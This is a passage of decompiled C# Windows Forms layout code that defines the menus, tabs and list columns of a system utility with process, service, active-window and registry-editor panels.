			(ToolStripItem)DeleteSelectedToolStripMenuItem
		});
		((Control)HKMenu).set_Name("HKMenu");
		ContextMenuStrip hKMenu = HKMenu;
		size = new Size(155, 70);
		((Control)hKMenu).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem1).set_Image((Image)(object)Resources._1485015490_adept_update);
		((ToolStripItem)RefreshToolStripMenuItem1).set_Name("RefreshToolStripMenuItem1");
		ToolStripMenuItem refreshToolStripMenuItem2 = RefreshToolStripMenuItem1;
		size = new Size(154, 22);
		((ToolStripItem)refreshToolStripMenuItem2).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem1).set_Text("Refresh");
		((ToolStripItem)CreateKeyToolStripMenuItem).set_Image((Image)(object)Resources._1485015627_folder_add);
		((ToolStripItem)CreateKeyToolStripMenuItem).set_Name("CreateKeyToolStripMenuItem");
		ToolStripMenuItem createKeyToolStripMenuItem = CreateKeyToolStripMenuItem;
		size = new Size(154, 22);
		((ToolStripItem)createKeyToolStripMenuItem).set_Size(size);
		((ToolStripItem)CreateKeyToolStripMenuItem).set_Text("Create Key");
		((ToolStripItem)DeleteSelectedToolStripMenuItem).set_Image((Image)(object)Resources._1485015737_folder_remove);
		((ToolStripItem)DeleteSelectedToolStripMenuItem).set_Name("DeleteSelectedToolStripMenuItem");
		ToolStripMenuItem deleteSelectedToolStripMenuItem = DeleteSelectedToolStripMenuItem;
		size = new Size(154, 22);
		((ToolStripItem)deleteSelectedToolStripMenuItem).set_Size(size);
		((ToolStripItem)DeleteSelectedToolStripMenuItem).set_Text("Delete Selected");
		((ToolStrip)HKVMenu).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)RefreshToolStripMenuItem2,
			(ToolStripItem)NewToolStripMenuItem,
			(ToolStripItem)DeleteToolStripMenuItem
		});
		((Control)HKVMenu).set_Name("HKVMenu");
		ContextMenuStrip hKVMenu = HKVMenu;
		size = new Size(114, 70);
		((Control)hKVMenu).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem2).set_Image((Image)(object)Resources._1485015490_adept_update1);
		((ToolStripItem)RefreshToolStripMenuItem2).set_Name("RefreshToolStripMenuItem2");
		ToolStripMenuItem refreshToolStripMenuItem3 = RefreshToolStripMenuItem2;
		size = new Size(113, 22);
		((ToolStripItem)refreshToolStripMenuItem3).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem2).set_Text("Refresh");
		((ToolStripDropDownItem)NewToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[6]
		{
			(ToolStripItem)StringToolStripMenuItem,
			(ToolStripItem)BinaryToolStripMenuItem,
			(ToolStripItem)DWOToolStripMenuItem,
			(ToolStripItem)QWORDToolStripMenuItem,
			(ToolStripItem)MultiStringToolStripMenuItem,
			(ToolStripItem)ExpandStringToolStripMenuItem
		});
		((ToolStripItem)NewToolStripMenuItem).set_Image((Image)(object)Resources.add_icon);
		((ToolStripItem)NewToolStripMenuItem).set_Name("NewToolStripMenuItem");
		ToolStripMenuItem newToolStripMenuItem = NewToolStripMenuItem;
		size = new Size(113, 22);
		((ToolStripItem)newToolStripMenuItem).set_Size(size);
		((ToolStripItem)NewToolStripMenuItem).set_Text("New");
		((ToolStripItem)StringToolStripMenuItem).set_Name("StringToolStripMenuItem");
		ToolStripMenuItem stringToolStripMenuItem = StringToolStripMenuItem;
		size = new Size(146, 22);
		((ToolStripItem)stringToolStripMenuItem).set_Size(size);
		((ToolStripItem)StringToolStripMenuItem).set_Text("String");
		((ToolStripItem)BinaryToolStripMenuItem).set_Name("BinaryToolStripMenuItem");
		ToolStripMenuItem binaryToolStripMenuItem = BinaryToolStripMenuItem;
		size = new Size(146, 22);
		((ToolStripItem)binaryToolStripMenuItem).set_Size(size);
		((ToolStripItem)BinaryToolStripMenuItem).set_Text("Binary");
		((ToolStripItem)DWOToolStripMenuItem).set_Name("DWOToolStripMenuItem");
		ToolStripMenuItem dWOToolStripMenuItem = DWOToolStripMenuItem;
		size = new Size(146, 22);
		((ToolStripItem)dWOToolStripMenuItem).set_Size(size);
		((ToolStripItem)DWOToolStripMenuItem).set_Text("DWORD");
		((ToolStripItem)QWORDToolStripMenuItem).set_Name("QWORDToolStripMenuItem");
		ToolStripMenuItem qWORDToolStripMenuItem = QWORDToolStripMenuItem;
		size = new Size(146, 22);
		((ToolStripItem)qWORDToolStripMenuItem).set_Size(size);
		((ToolStripItem)QWORDToolStripMenuItem).set_Text("QWORD");
		((ToolStripItem)MultiStringToolStripMenuItem).set_Name("MultiStringToolStripMenuItem");
		ToolStripMenuItem multiStringToolStripMenuItem = MultiStringToolStripMenuItem;
		size = new Size(146, 22);
		((ToolStripItem)multiStringToolStripMenuItem).set_Size(size);
		((ToolStripItem)MultiStringToolStripMenuItem).set_Text("Multi String");
		((ToolStripItem)ExpandStringToolStripMenuItem).set_Name("ExpandStringToolStripMenuItem");
		ToolStripMenuItem expandStringToolStripMenuItem = ExpandStringToolStripMenuItem;
		size = new Size(146, 22);
		((ToolStripItem)expandStringToolStripMenuItem).set_Size(size);
		((ToolStripItem)ExpandStringToolStripMenuItem).set_Text("Expand String");
		((ToolStripItem)DeleteToolStripMenuItem).set_Image((Image)(object)Resources.Corbeille_vide_1_icon);
		((ToolStripItem)DeleteToolStripMenuItem).set_Name("DeleteToolStripMenuItem");
		ToolStripMenuItem deleteToolStripMenuItem = DeleteToolStripMenuItem;
		size = new Size(113, 22);
		((ToolStripItem)deleteToolStripMenuItem).set_Size(size);
		((ToolStripItem)DeleteToolStripMenuItem).set_Text("Delete");
		((ToolStrip)PITMenu).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)RefreshToolStripMenuItem6,
			(ToolStripItem)RemoveToolStripMenuItem
		});
		((Control)PITMenu).set_Name("PITMenu");
		ContextMenuStrip pITMenu = PITMenu;
		size = new Size(118, 48);
		((Control)pITMenu).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem6).set_Image((Image)(object)Resources._1485015490_adept_update3);
		((ToolStripItem)RefreshToolStripMenuItem6).set_Name("RefreshToolStripMenuItem6");
		ToolStripMenuItem refreshToolStripMenuItem4 = RefreshToolStripMenuItem6;
		size = new Size(117, 22);
		((ToolStripItem)refreshToolStripMenuItem4).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem6).set_Text("Refresh");
		((ToolStripItem)RemoveToolStripMenuItem).set_Image((Image)(object)Resources.Corbeille_vide_1_icon1);
		((ToolStripItem)RemoveToolStripMenuItem).set_Name("RemoveToolStripMenuItem");
		ToolStripMenuItem removeToolStripMenuItem = RemoveToolStripMenuItem;
		size = new Size(117, 22);
		((ToolStripItem)removeToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoveToolStripMenuItem).set_Text("Remove");
		((ToolStrip)PMenustrip).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[8]
		{
			(ToolStripItem)RefreshToolStripMenuItem4,
			(ToolStripItem)KillDeleteToolStripMenuItem,
			(ToolStripItem)KillProcessToolStripMenuItem,
			(ToolStripItem)RestartProcessToolStripMenuItem,
			(ToolStripItem)SuspendProcessToolStripMenuItem,
			(ToolStripItem)ResumeProcessToolStripMenuItem,
			(ToolStripItem)CopyPathToolStripMenuItem,
			(ToolStripItem)PrToolStripMenuItem
		});
		((Control)PMenustrip).set_Name("PMenustrip");
		ContextMenuStrip pMenustrip = PMenustrip;
		size = new Size(163, 180);
		((Control)pMenustrip).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem4).set_Image((Image)(object)Resources._1485015490_adept_update5);
		((ToolStripItem)RefreshToolStripMenuItem4).set_Name("RefreshToolStripMenuItem4");
		ToolStripMenuItem refreshToolStripMenuItem5 = RefreshToolStripMenuItem4;
		size = new Size(162, 22);
		((ToolStripItem)refreshToolStripMenuItem5).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem4).set_Text("Refresh");
		((ToolStripItem)KillDeleteToolStripMenuItem).set_Image((Image)(object)Resources.Corbeille_vide_1_icon2);
		((ToolStripItem)KillDeleteToolStripMenuItem).set_Name("KillDeleteToolStripMenuItem");
		ToolStripMenuItem killDeleteToolStripMenuItem = KillDeleteToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)killDeleteToolStripMenuItem).set_Size(size);
		((ToolStripItem)KillDeleteToolStripMenuItem).set_Text("Kill + Delete");
		((ToolStripItem)KillProcessToolStripMenuItem).set_Image((Image)(object)Resources._1484282771_DeleteRed);
		((ToolStripItem)KillProcessToolStripMenuItem).set_Name("KillProcessToolStripMenuItem");
		ToolStripMenuItem killProcessToolStripMenuItem = KillProcessToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)killProcessToolStripMenuItem).set_Size(size);
		((ToolStripItem)KillProcessToolStripMenuItem).set_Text("Kill Process");
		((ToolStripItem)RestartProcessToolStripMenuItem).set_Image((Image)(object)Resources._1485016371_Update);
		((ToolStripItem)RestartProcessToolStripMenuItem).set_Name("RestartProcessToolStripMenuItem");
		ToolStripMenuItem restartProcessToolStripMenuItem = RestartProcessToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)restartProcessToolStripMenuItem).set_Size(size);
		((ToolStripItem)RestartProcessToolStripMenuItem).set_Text("Restart Process");
		((ToolStripItem)SuspendProcessToolStripMenuItem).set_Image((Image)(object)Resources._1485012029_Circle_Orange);
		((ToolStripItem)SuspendProcessToolStripMenuItem).set_Name("SuspendProcessToolStripMenuItem");
		ToolStripMenuItem suspendProcessToolStripMenuItem = SuspendProcessToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)suspendProcessToolStripMenuItem).set_Size(size);
		((ToolStripItem)SuspendProcessToolStripMenuItem).set_Text("Suspend Process");
		((ToolStripItem)ResumeProcessToolStripMenuItem).set_Image((Image)(object)Resources._1485011624_Circle_Red);
		((ToolStripItem)ResumeProcessToolStripMenuItem).set_Name("ResumeProcessToolStripMenuItem");
		ToolStripMenuItem resumeProcessToolStripMenuItem = ResumeProcessToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)resumeProcessToolStripMenuItem).set_Size(size);
		((ToolStripItem)ResumeProcessToolStripMenuItem).set_Text("Resume Process");
		((ToolStripItem)CopyPathToolStripMenuItem).set_Image((Image)(object)Resources._1486070004_editor_clipboard_glyph);
		((ToolStripItem)CopyPathToolStripMenuItem).set_Name("CopyPathToolStripMenuItem");
		ToolStripMenuItem copyPathToolStripMenuItem = CopyPathToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)copyPathToolStripMenuItem).set_Size(size);
		((ToolStripItem)CopyPathToolStripMenuItem).set_Text("Copy Path");
		((ToolStripItem)PrToolStripMenuItem).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((ToolStripItem)PrToolStripMenuItem).set_Image((Image)(object)Resources.document_properties_icon1);
		((ToolStripItem)PrToolStripMenuItem).set_Name("PrToolStripMenuItem");
		ToolStripMenuItem prToolStripMenuItem = PrToolStripMenuItem;
		size = new Size(162, 22);
		((ToolStripItem)prToolStripMenuItem).set_Size(size);
		((ToolStripItem)PrToolStripMenuItem).set_Text("Properties");
		((ToolStrip)TCPCL).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)RefreshToolStripMenuItem5,
			(ToolStripItem)KillConnectionToolStripMenuItem
		});
		((Control)TCPCL).set_Name("TCPCL");
		ContextMenuStrip tCPCL = TCPCL;
		size = new Size(156, 48);
		((Control)tCPCL).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem5).set_Image((Image)(object)Resources._1485015490_adept_update4);
		((ToolStripItem)RefreshToolStripMenuItem5).set_Name("RefreshToolStripMenuItem5");
		ToolStripMenuItem refreshToolStripMenuItem6 = RefreshToolStripMenuItem5;
		size = new Size(155, 22);
		((ToolStripItem)refreshToolStripMenuItem6).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem5).set_Text("Refresh");
		((ToolStripItem)KillConnectionToolStripMenuItem).set_Image((Image)(object)Resources._1484282771_DeleteRed);
		((ToolStripItem)KillConnectionToolStripMenuItem).set_Name("KillConnectionToolStripMenuItem");
		ToolStripMenuItem killConnectionToolStripMenuItem = KillConnectionToolStripMenuItem;
		size = new Size(155, 22);
		((ToolStripItem)killConnectionToolStripMenuItem).set_Size(size);
		((ToolStripItem)KillConnectionToolStripMenuItem).set_Text("Kill Connection");
		((ToolStrip)SMCL).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[6]
		{
			(ToolStripItem)RefreshToolStripMenuItem3,
			(ToolStripItem)StartToolStripMenuItem,
			(ToolStripItem)PauseToolStripMenuItem,
			(ToolStripItem)PauseToolStripMenuItem1,
			(ToolStripItem)RestartToolStripMenuItem,
			(ToolStripItem)RefreshServiceToolStripMenuItem
		});
		((Control)SMCL).set_Name("SMCL");
		ContextMenuStrip sMCL = SMCL;
		size = new Size(154, 136);
		((Control)sMCL).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem3).set_Image((Image)(object)Resources._1485015490_adept_update2);
		((ToolStripItem)RefreshToolStripMenuItem3).set_Name("RefreshToolStripMenuItem3");
		ToolStripMenuItem refreshToolStripMenuItem7 = RefreshToolStripMenuItem3;
		size = new Size(153, 22);
		((ToolStripItem)refreshToolStripMenuItem7).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem3).set_Text("Refresh");
		((ToolStripItem)StartToolStripMenuItem).set_Image((Image)(object)Resources._1485011616_Circle_Green);
		((ToolStripItem)StartToolStripMenuItem).set_Name("StartToolStripMenuItem");
		ToolStripMenuItem startToolStripMenuItem = StartToolStripMenuItem;
		size = new Size(153, 22);
		((ToolStripItem)startToolStripMenuItem).set_Size(size);
		((ToolStripItem)StartToolStripMenuItem).set_Text("Start");
		((ToolStripItem)PauseToolStripMenuItem).set_Image((Image)(object)Resources._1485011624_Circle_Red);
		((ToolStripItem)PauseToolStripMenuItem).set_Name("PauseToolStripMenuItem");
		ToolStripMenuItem pauseToolStripMenuItem = PauseToolStripMenuItem;
		size = new Size(153, 22);
		((ToolStripItem)pauseToolStripMenuItem).set_Size(size);
		((ToolStripItem)PauseToolStripMenuItem).set_Text("Stop");
		((ToolStripItem)PauseToolStripMenuItem1).set_Image((Image)(object)Resources._1485012029_Circle_Orange);
		((ToolStripItem)PauseToolStripMenuItem1).set_Name("PauseToolStripMenuItem1");
		ToolStripMenuItem pauseToolStripMenuItem2 = PauseToolStripMenuItem1;
		size = new Size(153, 22);
		((ToolStripItem)pauseToolStripMenuItem2).set_Size(size);
		((ToolStripItem)PauseToolStripMenuItem1).set_Text("Pause");
		((ToolStripItem)RestartToolStripMenuItem).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		((ToolStripItem)RestartToolStripMenuItem).set_Name("RestartToolStripMenuItem");
		ToolStripMenuItem restartToolStripMenuItem = RestartToolStripMenuItem;
		size = new Size(153, 22);
		((ToolStripItem)restartToolStripMenuItem).set_Size(size);
		((ToolStripItem)RestartToolStripMenuItem).set_Text("Restart");
		((ToolStripItem)RefreshServiceToolStripMenuItem).set_Image((Image)(object)Resources._1485016371_Update);
		((ToolStripItem)RefreshServiceToolStripMenuItem).set_Name("RefreshServiceToolStripMenuItem");
		ToolStripMenuItem refreshServiceToolStripMenuItem = RefreshServiceToolStripMenuItem;
		size = new Size(153, 22);
		((ToolStripItem)refreshServiceToolStripMenuItem).set_Size(size);
		((ToolStripItem)RefreshServiceToolStripMenuItem).set_Text("Refresh Service");
		ImageList2.set_ColorDepth((ColorDepth)32);
		ImageList imageList = ImageList2;
		size = new Size(22, 22);
		imageList.set_ImageSize(size);
		ImageList2.set_TransparentColor(Color.Transparent);
		ImageList3.set_ColorDepth((ColorDepth)32);
		ImageList imageList2 = ImageList3;
		size = new Size(22, 22);
		imageList2.set_ImageSize(size);
		ImageList3.set_TransparentColor(Color.Transparent);
		((TabControl)EtherealTabControl1).set_Alignment((TabAlignment)2);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage2);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage3);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage4);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage5);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage6);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage7);
		((Control)EtherealTabControl1).set_Dock((DockStyle)5);
		((TabControl)EtherealTabControl1).set_ImageList(ImageList1);
		EtherealTabControl etherealTabControl = EtherealTabControl1;
		size = new Size(40, 151);
		((TabControl)etherealTabControl).set_ItemSize(size);
		EtherealTabControl etherealTabControl2 = EtherealTabControl1;
		Point location = new Point(0, 0);
		((Control)etherealTabControl2).set_Location(location);
		((TabControl)EtherealTabControl1).set_Multiline(true);
		((Control)EtherealTabControl1).set_Name("EtherealTabControl1");
		((TabControl)EtherealTabControl1).set_SelectedIndex(0);
		EtherealTabControl etherealTabControl3 = EtherealTabControl1;
		size = new Size(1047, 466);
		((Control)etherealTabControl3).set_Size(size);
		((TabControl)EtherealTabControl1).set_SizeMode((TabSizeMode)2);
		((Control)EtherealTabControl1).set_TabIndex(0);
		((Control)TabPage1).get_Controls().Add((Control)(object)Button1);
		((Control)TabPage1).get_Controls().Add((Control)(object)StatusStrip5);
		((Control)TabPage1).get_Controls().Add((Control)(object)MenuStrip2);
		((Control)TabPage1).get_Controls().Add((Control)(object)Processlists);
		TabPage tabPage = TabPage1;
		location = new Point(155, 4);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(888, 458);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("Process Manager");
		TabPage1.set_UseVisualStyleBackColor(true);
		((ButtonBase)Button1).set_Image((Image)(object)Resources.Apps_Task_Manager_alt_2_Metro_icon1);
		((ButtonBase)Button1).set_ImageAlign((ContentAlignment)16);
		Button button = Button1;
		location = new Point(15, 4);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(98, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("Create Task");
		((ButtonBase)Button1).set_TextAlign((ContentAlignment)64);
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip5).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)ToolStripStatusLabel1,
			(ToolStripItem)ToolStripStatusLabel2,
			(ToolStripItem)ToolStripStatusLabel4
		});
		StatusStrip statusStrip = StatusStrip5;
		location = new Point(3, 433);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip5).set_Name("StatusStrip5");
		StatusStrip statusStrip2 = StatusStrip5;
		size = new Size(882, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip5).set_TabIndex(1);
		((Control)StatusStrip5).set_Text("StatusStrip5");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel1;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel2).set_Name("ToolStripStatusLabel2");
		ToolStripStatusLabel toolStripStatusLabel2 = ToolStripStatusLabel2;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel2).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel4).set_Name("ToolStripStatusLabel4");
		ToolStripStatusLabel toolStripStatusLabel3 = ToolStripStatusLabel4;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel3).set_Size(size);
		MenuStrip2.set_GripStyle((ToolStripGripStyle)1);
		MenuStrip menuStrip = MenuStrip2;
		location = new Point(3, 3);
		((Control)menuStrip).set_Location(location);
		((Control)MenuStrip2).set_Name("MenuStrip2");
		MenuStrip menuStrip2 = MenuStrip2;
		size = new Size(882, 24);
		((Control)menuStrip2).set_Size(size);
		((Control)MenuStrip2).set_TabIndex(2);
		((Control)MenuStrip2).set_Text("MenuStrip2");
		Processlists.set_AllowColumnReorder(true);
		((Control)Processlists).set_Anchor((AnchorStyles)15);
		Processlists.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[9] { ColumnHeader4, ColumnHeader5, ColumnHeader6, ColumnHeader7, ColumnHeader8, ColumnHeader9, ColumnHeader25, ColumnHeader26, ColumnHeader27 });
		((Control)Processlists).set_ContextMenuStrip(PMenustrip);
		((Control)Processlists).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Processlists.set_FullRowSelect(true);
		Processlists.set_GridLines(true);
		Processlists.set_LargeImageList(ImageList2);
		ListView processlists = Processlists;
		location = new Point(3, 30);
		((Control)processlists).set_Location(location);
		Processlists.set_MultiSelect(false);
		((Control)Processlists).set_Name("Processlists");
		Processlists.set_RightToLeftLayout(true);
		ListView processlists2 = Processlists;
		size = new Size(882, 400);
		((Control)processlists2).set_Size(size);
		Processlists.set_SmallImageList(ImageList2);
		((Control)Processlists).set_TabIndex(0);
		Processlists.set_UseCompatibleStateImageBehavior(false);
		Processlists.set_View((View)1);
		ColumnHeader4.set_Text("Process Name");
		ColumnHeader4.set_Width(270);
		ColumnHeader5.set_Text("ID ( PID )");
		ColumnHeader5.set_Width(109);
		ColumnHeader6.set_Text("Memory Usage");
		ColumnHeader6.set_Width(128);
		ColumnHeader7.set_Text("Path");
		ColumnHeader7.set_Width(199);
		ColumnHeader8.set_Text("Creation Date");
		ColumnHeader8.set_Width(93);
		ColumnHeader9.set_Text("Handle");
		ColumnHeader25.set_Text("Priority");
		ColumnHeader26.set_Text("Threads");
		ColumnHeader27.set_Text("Modules");
		((Control)TabPage2).get_Controls().Add((Control)(object)StatusStrip4);
		((Control)TabPage2).get_Controls().Add((Control)(object)SM);
		TabPage tabPage4 = TabPage2;
		location = new Point(155, 4);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(888, 458);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("Service Manager");
		TabPage2.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip4).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ToolStripStatusLabel5,
			(ToolStripItem)ToolStripStatusLabel8
		});
		StatusStrip statusStrip3 = StatusStrip4;
		location = new Point(3, 433);
		((Control)statusStrip3).set_Location(location);
		((Control)StatusStrip4).set_Name("StatusStrip4");
		StatusStrip statusStrip4 = StatusStrip4;
		size = new Size(882, 22);
		((Control)statusStrip4).set_Size(size);
		((Control)StatusStrip4).set_TabIndex(1);
		((Control)StatusStrip4).set_Text("StatusStrip4");
		((ToolStripItem)ToolStripStatusLabel5).set_Name("ToolStripStatusLabel5");
		ToolStripStatusLabel toolStripStatusLabel4 = ToolStripStatusLabel5;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel4).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel8).set_Name("ToolStripStatusLabel8");
		ToolStripStatusLabel toolStripStatusLabel5 = ToolStripStatusLabel8;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel5).set_Size(size);
		((Control)SM).set_Anchor((AnchorStyles)15);
		SM.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[5] { ColumnHeader10, ColumnHeader11, ColumnHeader12, ColumnHeader13, ColumnHeader14 });
		((Control)SM).set_ContextMenuStrip(SMCL);
		((Control)SM).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		SM.set_FullRowSelect(true);
		SM.set_GridLines(true);
		ListView sM = SM;
		location = new Point(3, 3);
		((Control)sM).set_Location(location);
		((Control)SM).set_Name("SM");
		ListView sM2 = SM;
		size = new Size(882, 427);
		((Control)sM2).set_Size(size);
		SM.set_SmallImageList(Images);
		((Control)SM).set_TabIndex(0);
		SM.set_UseCompatibleStateImageBehavior(false);
		SM.set_View((View)1);
		ColumnHeader10.set_Text("Statut");
		ColumnHeader10.set_Width(116);
		ColumnHeader11.set_Text("Display Name");
		ColumnHeader11.set_Width(119);
		ColumnHeader12.set_Text("Service Name");
		ColumnHeader12.set_Width(134);
		ColumnHeader13.set_Text("Service Type");
		ColumnHeader13.set_Width(123);
		ColumnHeader14.set_Text("Can Stop it ?");
		ColumnHeader14.set_Width(89);
		((Control)TabPage3).get_Controls().Add((Control)(object)StatusStrip3);
		((Control)TabPage3).get_Controls().Add((Control)(object)AW);
		TabPage tabPage7 = TabPage3;
		location = new Point(155, 4);
		tabPage7.set_Location(location);
		((Control)TabPage3).set_Name("TabPage3");
		TabPage tabPage8 = TabPage3;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage8).set_Padding(padding);
		TabPage tabPage9 = TabPage3;
		size = new Size(888, 458);
		((Control)tabPage9).set_Size(size);
		TabPage3.set_TabIndex(2);
		TabPage3.set_Text("Active Windows");
		TabPage3.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel3 });
		StatusStrip statusStrip5 = StatusStrip3;
		location = new Point(3, 433);
		((Control)statusStrip5).set_Location(location);
		((Control)StatusStrip3).set_Name("StatusStrip3");
		StatusStrip statusStrip6 = StatusStrip3;
		size = new Size(882, 22);
		((Control)statusStrip6).set_Size(size);
		((Control)StatusStrip3).set_TabIndex(1);
		((Control)StatusStrip3).set_Text("StatusStrip3");
		((ToolStripItem)ToolStripStatusLabel3).set_Name("ToolStripStatusLabel3");
		ToolStripStatusLabel toolStripStatusLabel6 = ToolStripStatusLabel3;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel6).set_Size(size);
		((Control)AW).set_Anchor((AnchorStyles)15);
		AW.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[7] { ColumnHeader1, ColumnHeader2, ColumnHeader3, ColumnHeader28, ColumnHeader29, ColumnHeader30, ColumnHeader31 });
		((Control)AW).set_ContextMenuStrip(AWCL);
		((Control)AW).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		AW.set_FullRowSelect(true);
		AW.set_GridLines(true);
		ListView aW = AW;
		location = new Point(3, 3);
		((Control)aW).set_Location(location);
		AW.set_MultiSelect(false);
		((Control)AW).set_Name("AW");
		ListView aW2 = AW;
		size = new Size(882, 427);
		((Control)aW2).set_Size(size);
		AW.set_SmallImageList(Images);
		((Control)AW).set_TabIndex(0);
		AW.set_UseCompatibleStateImageBehavior(false);
		AW.set_View((View)1);
		ColumnHeader1.set_Text("Window Title");
		ColumnHeader1.set_Width(273);
		ColumnHeader2.set_Text("Handle");
		ColumnHeader2.set_Width(91);
		ColumnHeader3.set_Text("Visible");
		ColumnHeader3.set_Width(64);
		ColumnHeader28.set_Text("Class Name");
		ColumnHeader28.set_Width(93);
		ColumnHeader29.set_Text("Process");
		ColumnHeader29.set_Width(137);
		ColumnHeader30.set_Text("Process PID");
		ColumnHeader30.set_Width(87);
		ColumnHeader31.set_Text("Description");
		ColumnHeader31.set_Width(126);
		((Control)TabPage4).get_Controls().Add((Control)(object)Panel5);
		((Control)TabPage4).get_Controls().Add((Control)(object)Panel4);
		((Control)TabPage4).get_Controls().Add((Control)(object)StatusStrip6);
		TabPage tabPage10 = TabPage4;
		location = new Point(155, 4);
		tabPage10.set_Location(location);
		((Control)TabPage4).set_Name("TabPage4");
		TabPage tabPage11 = TabPage4;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage11).set_Padding(padding);
		TabPage tabPage12 = TabPage4;
		size = new Size(888, 458);
		((Control)tabPage12).set_Size(size);
		TabPage4.set_TabIndex(3);
		TabPage4.set_Text("Registry Editor");
		TabPage4.set_UseVisualStyleBackColor(true);
		((Control)Panel5).get_Controls().Add((Control)(object)RegPath);
		((Control)Panel5).get_Controls().Add((Control)(object)ValuesRegName);
		((Control)Panel5).set_Dock((DockStyle)5);
		Panel panel = Panel5;
		location = new Point(234, 3);
		((Control)panel).set_Location(location);
		((Control)Panel5).set_Name("Panel5");
		Panel panel2 = Panel5;
		size = new Size(651, 430);
		((Control)panel2).set_Size(size);
		((Control)Panel5).set_TabIndex(7);
		RegPath.set_AutoSize(true);
		((Control)RegPath).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label regPath = RegPath;
		location = new Point(11, 11);
		((Control)regPath).set_Location(location);
		((Control)RegPath).set_Name("RegPath");
		Label regPath2 = RegPath;
		size = new Size(15, 15);
		((Control)regPath2).set_Size(size);
		((Control)RegPath).set_TabIndex(2);
		RegPath.set_Text("--");
		((Control)ValuesRegName).set_Anchor((AnchorStyles)15);
		ValuesRegName.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[3] { ColumnHeader22, ColumnHeader23, ColumnHeader24 });
		((Control)ValuesRegName).set_ContextMenuStrip(HKVMenu);
